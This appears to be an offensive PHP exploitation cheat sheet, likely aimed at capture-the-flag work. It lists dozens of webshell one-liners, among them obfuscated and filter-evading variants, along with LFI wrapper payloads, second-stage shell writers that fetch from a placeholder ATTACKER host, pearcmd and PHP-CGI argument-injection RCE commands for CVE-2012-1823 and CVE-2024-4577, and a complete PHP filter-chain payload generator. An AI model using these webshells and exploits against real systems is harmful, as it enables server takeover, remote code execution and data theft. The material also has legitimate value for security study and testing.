# PHP

## First Checks

```text
/?file=php://filter/convert.base64-encode/resource=index.php
/?page=data://text/plain,<?=`$_GET[0]`?>
/?page=php://input
/?page=expect://id
/?page=zip://shell.jpg%23shell.php
/?page=phar://upload.jpg/test.txt
```

Source/config targets:

```text
composer.json
composer.lock
.env
config.php
index.php
vendor/autoload.php
/proc/self/environ
/proc/self/cmdline
```

Dangerous sinks to search:

```bash
rg -n "include|require|eval|assert|system|exec|shell_exec|passthru|popen|proc_open|unserialize|preg_replace|create_function|extract|parse_str|call_user_func|ReflectionFunction|file_get_contents|move_uploaded_file" .
```

## Webshell

Small command shells:

```php
<?=`$_GET[0]`?>
<?=`$_REQUEST[0]`?>
<?=$_GET[0]($_GET[1]);?>
<?=system($_GET[0]);?>
<?=passthru($_GET[0]);?>
<?=shell_exec($_GET[0]);?>
<?php system($_GET[0]); ?>
<?php passthru($_REQUEST[0]); ?>
<?php echo shell_exec($_POST[0]); ?>
<?php $f='sys'.'tem'; $f($_GET[0]); ?>
<?php array_map('system', $_GET); ?>
<?php assert($_GET[0]); ?>
<?php eval($_POST[0]); ?>
```

Legacy short shells:

```php
<?=`$_GET[0]`?>
${_GET}{0}('id');
${~'%A0%B8%BA%AB'}{0}('id');
${~\xa0\xb8\xba\xab}{0}(${~\xa0\xb8\xba\xab}{1}); // use 0=assert&1=system('id');
```

Call:

```text
/shell.php?0=id
/shell.php?0=cat%20/flag*
/shell.php?0=system&1=id
curl -X POST http://HOST/shell.php -d '0=id'
```

Read-only flag shells when command execution is blocked:

```php
<?=file_get_contents("/flag")?>
<?=readfile("/flag")?>
<?=highlight_file(__FILE__)?>
<?=print_r(scandir("/"))?>
<?=var_dump(glob("/*"))?>
<?=implode("\n",glob("/*"))?>
```

Write a second-stage shell:

```php
<?=file_put_contents("/tmp/s.php","<?=`$_GET[0]`?>")?>
<?=copy("http://ATTACKER/s.txt","/tmp/s.php")?>
<?=fwrite(fopen("/tmp/s.php","w"),"<?=$_GET[0]($_GET[1]);?>")?>
```

Callback helpers:

```php
<?=call_user_func($_GET[0],$_GET[1]);?>
<?=call_user_func_array($_GET[0],$_GET[1]);?>
<?=array_map($_GET[0],[$_GET[1]]);?>
<?=filter_var($_GET[1],FILTER_CALLBACK,["options"=>$_GET[0]]);?>
```

```text
?0=system&1=id
?0=file_get_contents&1=/flag
?0=printf&1[]=CBC{%s}&1[]=test
```

Function + argument over request parameters:

```php
<?=$_=$_GET;$_[0]($_[1]);?>
<?=$_=$_POST;$_[0]($_[1]);?>
<?=$_=$_REQUEST;$_[0]($_[1]);?>
```

```text
?0=system&1=id
?0=print_r&1=scandir&2=/
```

Nested call for functions that do not print:

```php
<?=$_=$_GET;$_[0]($_[1]($_[2]));?>
<?=$_=$_POST;$_[0]($_[1]($_[2]));?>
```

```text
?0=print_r&1=file_get_contents&2=/flag.txt
?0=var_dump&1=scandir&2=/
```

Keep these older constrained payloads around; they are still useful in filters:

Without alphanumeric:

```php
<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?> <?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
```

Without spaces webshell:

```php
<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]);?>
<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]($_[2]));?>
```

Without space and alphanumeric:

```php
<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']);?>
<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']($_['____']));?>
```

Multiple arguments through `call_user_func_array`:

```php
<?=$_=$_GET;$_[0]($_[1],$_[2]);?>
<?=$_=$_GET;$_[0]($_[1],$_[2],$_[3]);?>
```

```text
?0=file_put_contents&1=/tmp/x.php&2=<?=`$_GET[0]`?>
?0=call_user_func_array&1=file_put_contents&2[]=/tmp/x.txt&2[]=hello
```

No parentheses:

```php
<?=include"/flag"?>
<?=require"/flag"?>
<?=print`$_GET[0]`?>
```

No quotes:

```php
<?=`$_GET[0]`?>
<?=$_GET[0]($_GET[1])?>
<?=include$_GET[0]?>
```

No semicolon:

```php
<?=system($_GET[0])?>
<?=`$_GET[0]`?>
```

No `<?php` long tag:

```php
<?=`$_GET[0]`?>
<script language=php>system($_GET[0]);</script>
```

No `system` string:

```php
<?=$_=("sys"."tem");$_($_GET[0]);?>
<?=$_=str_rot13("flfgrz");$_($_GET[0]);?>
<?=$_=base64_decode("c3lzdGVt");$_($_GET[0]);?>
```

No spaces:

```php
<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]);?>
<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]($_[2]));?>
```

```text
?0=system&1=id
?0=print_r&1=file_get_contents&2=/flag.txt
```

No alphanumeric in shell body:

```php
<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']);?>
<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']($_['____']));?>
```

```text
?_GET[_]=system&_GET[__]=id
?__=system&___=id
?__=print_r&___=file_get_contents&____=/flag.txt
```

Non-alphanumeric and no quotes, using request parameter `0=function&1=arg`:

```php
<?=$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]);
```

```bash
curl 'http://HOST/shell.php' -d '0=system&1=id'
curl 'http://HOST/shell.php' -d '0=system&1=cat /flag*'
```

GET variant:

```php
<?=$_=[]..1;$_=$_[1].$_[1].$_[1].$_[3]^-575..-1;$$_[0]($$_[1]);
```

```bash
curl 'http://HOST/shell.php?0=system&1=id'
```

POST variant:

```php
<?=$_=[]..1;$_=$_[1].$_[3].$_[3].$_[3].$_[4]^-1.2.-1;$$_[0]($$_[1]);
```

```bash
curl 'http://HOST/shell.php' -X POST -d '0=system&1=id'
```

No quotes via `INF` string:

```php
<?=$_=9**999...1;$_=801..-1^($_[4].+92..$_[0])^$_;$$_[0]($$_[1]);
<?=$_=-9**999...1;$_=4408..-1^$_^$_[3].$_[0].$_[6].$_[0].$_[1];$$_[0]($$_[1]);
```

PHP 7 underscore-constant variants:

```php
<?=$_=[]._;$_=_.($_[2].$_[2].$_[3]^575.._);$$_[0]($$_[1]);
<?=$_=[]._;$_=_.($_[3].$_[4].$_[3].$_[3]^1625.._);$$_[0]($$_[1]);
```

Extended no-alnum shell for non-printing file reads:

```php
<?=$_=[]._;$_=${_.($_[2].$_[2].$_[3]^575.._)};$_[0]($_[1]($_[2],$_[3]));
```

```text
0=print_r&1=call_user_func_array&2=file_put_contents&3[]=/tmp/x.txt&3[]=hello
```

If warnings break output, try prefixing the type-cast expression with `@` in array/string based shells.

## Wrappers

Read source:

```text
php://filter/convert.base64-encode/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=/flag
```

Execute through include:

```text
data://text/plain,<?=`$_GET[0]`?>
data://text/plain;base64,PD89YCRfR0VUWzBdYDs/Pg==
php://input
expect://id
```

Archive wrappers:

```text
zip://upload.jpg%23shell.php
phar://upload.jpg/shell.txt
compress.zlib://file.gz
```

Create zip wrapper payload:

```bash
echo '<?=`$_GET[0]`?>' > shell.php
zip shell.jpg shell.php
```

## Type Juggling

Loose comparison:

```php
0 == "a"
"0e12345" == "0e54321"
[] == false
null == false
```

Magic hashes:

```text
md5("240610708") = 0e462097431906509019562988736854
md5("QNKCDZO")   = 0e830400451993494058024219903391
sha1("aaroZmOk") = 0e66507019969427134894567494305185566735
```

Payload shapes:

```json
{"password":0}
{"password":true}
{"password":[]}
```

Common bugs:

```php
if ($_GET["h"] == md5($secret)) {}
if (strcmp($_GET["p"], $password) == 0) {}
if (in_array($_GET["role"], ["user", "admin"])) {}
```

Try:

```text
?h=0
?p[]=x
?role=0
```

## Variable Override

Look for `extract($_GET)`, `parse_str`, variable variables, or merging user arrays into config.

```text
?is_admin=1
?role=admin
?debug=1
?GLOBALS[flag]=1
?_SESSION[admin]=1
?config[debug]=1
```

Array confusion:

```text
id[]=1
id[0]=1
id[$ne]=1
file[]=index.php
```

## Deserialization

PHP serialized probes:

```text
O:8:"stdClass":1:{s:1:"x";s:1:"y";}
a:1:{s:5:"admin";b:1;}
b:1;
i:0;
N;
```

Look for magic methods:

```php
__wakeup
__destruct
__toString
__call
__get
__invoke
```

PHAR metadata deserialization can trigger through file functions if a vulnerable gadget is autoloaded:

```text
file_exists("phar://upload.jpg/a")
is_file("phar://upload.jpg/a")
getimagesize("phar://upload.jpg/a")
exif_read_data("phar://upload.jpg/a")
```

## Sessions / Temp Files

Session file inclusion:

```text
/var/lib/php/sessions/sess_<PHPSESSID>
/tmp/sess_<PHPSESSID>
```

Set session content, then include the session file:

```http
Cookie: PHPSESSID=pwn

name=<?=`$_GET[0]`?>
```

Upload progress temporary session content:

```text
PHP_SESSION_UPLOAD_PROGRESS=<?=`$_GET[0]`?>
```

## pearcmd / peclcmd

If LFI can include PHP files and query args are parsed like CLI argv:

```text
/?+config-create+/<?=system($_GET[0]);?>+/tmp/s.php&file=/usr/local/lib/php/pearcmd.php
/?file=/tmp/s.php&0=id
/?+install+--force+--installroot+/tmp/pwn+http://ATTACKER/pkg.tgz&file=/usr/local/lib/php/peclcmd.php
```

## PHP-CGI Argument Injection

Bug class: user-controlled query string becomes command-line arguments to `php-cgi`. This is the Metasploit-style category you usually see as PHP CGI argument injection.

Relevant CVEs:

```text
CVE-2012-1823: classic PHP-CGI query-string argument injection.
CVE-2024-4577: Windows PHP-CGI best-fit character bypass, similar impact.
```

Quick checks:

```bash
curl -i 'http://TARGET/index.php?-s'
curl -i 'http://TARGET/index.php?%2ds'
curl -i 'http://TARGET/index.php?%ADs'
```

If vulnerable, source disclosure often works with `-s`. RCE shape is to enable URL includes and prepend PHP from request body:

```bash
curl 'http://TARGET/index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input&0=id' \
  --data '<?php system($_GET[0]); ?>'
```

Encoded hyphen variant:

```bash
curl 'http://TARGET/index.php?%2dd+allow_url_include=1+%2dd+auto_prepend_file=php://input&0=id' \
  --data '<?php system($_GET[0]); ?>'
```

CVE-2024-4577 Windows best-fit uses soft hyphen as `-` on affected locales:

```bash
curl 'http://TARGET/index.php?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input&0=id' \
  --data '<?php system($_GET[0]); ?>'
```

Other useful flags:

```text
-s                              source highlight / disclosure
-n                              no php.ini
-d key=value                    override ini value
-d disable_functions=           try clearing disabled_functions if allowed
-d open_basedir=                try clearing open_basedir if allowed
-d auto_prepend_file=php://input
-d auto_append_file=php://input
```

Notes:

```text
Works against CGI/FastCGI-style exposure, not normal mod_php.
CVE-2024-4577 is Windows/locale/codepage specific.
If `?` arguments are normalized by a proxy, try encoded hyphen and plus/space variants.
```

## PHP Filter / iconv CNEXT

Bug class: PHP file-read/LFI primitive plus `php://filter` can become RCE through filter-chain heap manipulation. The famous modern case is CVE-2024-2961, a glibc `iconv()` out-of-bounds write when converting to `ISO-2022-CN-EXT`.

Use when:

```text
You can read arbitrary files through php://filter.
Target is Linux/glibc, not Windows.
glibc is vulnerable or unpatched.
The app runs PHP and exposes a stable file read endpoint.
```

Triage payloads:

```text
/?file=php://filter/convert.base64-encode/resource=/etc/passwd
/?file=php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=/etc/passwd
/?file=php://filter/convert.iconv.UTF8.CSISO2022KR/resource=/etc/passwd
```

If the read endpoint supports filters and the target looks vulnerable, use a maintained exploit generator instead of hand-writing the chain:

```bash
git clone --recurse-submodules https://github.com/ambionics/cnext-exploits.git
```

Related filter-chain tools/ideas:

```text
php_filter_chain_generator: build PHP code through filters for include sinks.
wrapwrap: force prefix/suffix around filter output to satisfy parsers.
CNEXT / CVE-2024-2961: turn certain PHP file-read primitives into RCE.
```

Important distinction:

```text
filter-chain generator needs an include/eval-like sink.
CNEXT targets some read-only file disclosure primitives and may upgrade them to RCE.
pearcmd/peclcmd needs includable PEAR PHP files and argv-style query parsing.
PHP-CGI arg injection does not need LFI; it targets CGI argument parsing.
```

## Disabled Function Bypasses

Check:

```php
ini_get("disable_functions");
function_exists("system");
```

Alternatives:

```text
exec
shell_exec
passthru
popen
proc_open
pcntl_exec
mail
putenv + LD_PRELOAD
ImageMagick / Ghostscript / ffmpeg delegates
```

## Filter Chain Generator

```python
#!/usr/bin/env python3
import argparse
import base64
import re

# - Useful infos -
# https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
# https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
# https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d

# No need to guess a valid filename anymore
file_to_use = "php://temp"

conversions = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
    '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
    '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
    '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
    'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
    'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
    'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
    'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
    'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
    'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
    'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
    'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
    'M':'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'm':'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
    'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
    'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
    'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
    'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
    't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
    'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
    'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
    'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
    'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
    'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
    'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
    '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
    '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
    '=': ''
}

def generate_filter_chain(chain, debug_base64 = False):

    encoded_chain = chain
    # generate some garbage base64
    filters = "convert.iconv.UTF8.CSISO2022KR|"
    filters += "convert.base64-encode|"
    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file
    filters += "convert.iconv.UTF8.UTF7|"


    for c in encoded_chain[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"
    if not debug_base64:
        # don't add the decode while debugging chains
        filters += "convert.base64-decode"

    final_payload = f"php://filter/{filters}/resource={file_to_use}"
    return final_payload

def main():

    # Parsing command line arguments
    parser = argparse.ArgumentParser(description="PHP filter chain generator.")

    parser.add_argument("--chain", help="Content you want to generate. (you will maybe need to pad with spaces for your payload to work)", required=False)
    parser.add_argument("--rawbase64", help="The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.", required=False)
    args = parser.parse_args()
    if args.chain is not None:
        chain = args.chain.encode('utf-8')
        base64_value = base64.b64encode(chain).decode('utf-8').replace("=", "")
        chain = generate_filter_chain(base64_value)
        print("[+] The following gadget chain will generate the following code : {} (base64 value: {})".format(args.chain, base64_value))
        print(chain)
    if args.rawbase64 is not None:
        rawbase64 = args.rawbase64.replace("=", "")
        match = re.search("^([A-Za-z0-9+/])*$", rawbase64)
        if (match):
            chain = generate_filter_chain(rawbase64, True)
            print(chain)
        else:
            print ("[-] Base64 string required.")
            exit(1)

if __name__ == "__main__":
    main()
```
